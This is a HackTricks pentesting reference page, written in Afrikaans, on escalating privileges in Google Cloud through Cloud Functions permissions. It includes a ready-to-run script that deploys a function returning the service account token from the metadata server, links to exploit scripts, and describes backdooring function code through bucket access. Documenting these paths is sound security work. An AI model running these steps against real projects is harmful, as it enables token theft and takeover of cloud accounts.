# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

Meer inligting oor Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

'n Aanvaller met hierdie voorregte kan **'n nuwe Cloud Function met arbitrêre (kwaadaardige) kode skep en dit aan 'n Service Account toewys**. Dan, lek die Service Account token uit die metadata om voorregte na dit te eskaleer.\
Sommige voorregte om die funksie te aktiveer mag benodig word.

Eksploitasieskripte vir hierdie metode kan [hier gevind word](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) en [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) en die voorafgeboude .zip-lêer kan [hier gevind word](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

'n Aanvaller met hierdie voorregte kan **die kode van 'n Funksie wysig en selfs die diensrekening wat aangeheg is, wysig** met die doel om die token te eksterneer.

> [!CAUTION]
> Om cloud funksies te ontplooi, sal jy ook actAs-toestemmings oor die standaard rekenaar diensrekening of oor die diensrekening wat gebruik word om die beeld te bou, benodig.

Sommige ekstra voorregte soos `.call` toestemming vir weergawe 1 cloudfunctions of die rol `role/run.invoker` om die funksie te aktiveer mag benodig word.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> As jy die fout `Permission 'run.services.setIamPolicy' denied on resource...` kry, is dit omdat jy die `--allow-unauthenticated` param gebruik en jy nie genoeg toestemming daarvoor het nie.

Die eksploitasie-skrip vir hierdie metode kan [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py) gevind word.

### `cloudfunctions.functions.sourceCodeSet`

Met hierdie toestemming kan jy 'n **ondertekende URL kry om 'n lêer na 'n funksiebucket op te laai (maar die kode van die funksie sal nie verander word nie, jy moet dit steeds opdateer)**
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
Nie regtig seker hoe nuttig net hierdie toestemming is vanuit 'n aanvaller se perspektief nie, maar dit is goed om te weet.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

Gee jouself enige van die vorige **`.update`** of **`.create`** voorregte om op te skaal.

### `cloudfunctions.functions.update`

Slegs met **`cloudfunctions`** toestemmings, sonder **`iam.serviceAccounts.actAs`** sal jy **nie in staat wees om die funksie op te dateer nie SO DIT IS NIE 'N GESKIKTE PRIVESC NIE.**

### Lees- en Skryftoegang oor die emmer

As jy lees- en skryftoegang oor die emmer het, kan jy veranderinge in die kode monitor en wanneer 'n **opdatering in die emmer plaasvind, kan jy die nuwe kode met jou eie kode opdateer** sodat die nuwe weergawe van die Cloud Function met die ingediende backdoored kode uitgevoer sal word.

Jy kan meer oor die aanval nagaan in:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

Echter, jy kan dit nie gebruik om derdeparty Cloud Functions vooraf te kompromitteer nie, want as jy die emmer in jou rekening skep en dit openbare toestemmings gee sodat die eksterne projek daaroor kan skryf, kry jy die volgende fout:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> Ehowever, dit kan gebruik word vir DoS-aanvalle.

### Lees- en Skryftoegang oor Artifact Registry

Wanneer 'n Cloud Function geskep word, word 'n nuwe docker beeld na die Artifact Registry van die projek gepush. Ek het probeer om die beeld met 'n nuwe een te wysig, en selfs die huidige beeld (en die `cache` beeld) te verwyder en niks het verander nie, die cloud function het voortgegaan om te werk. Daarom, miskien **kan dit moontlik wees om 'n Race Condition aanval te misbruik** soos met die emmer om die docker houer wat uitgevoer sal word te verander, maar **net die gestoor beeld te wysig is nie moontlik om die Cloud Function te kompromitteer nie.**

## Verwysings

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
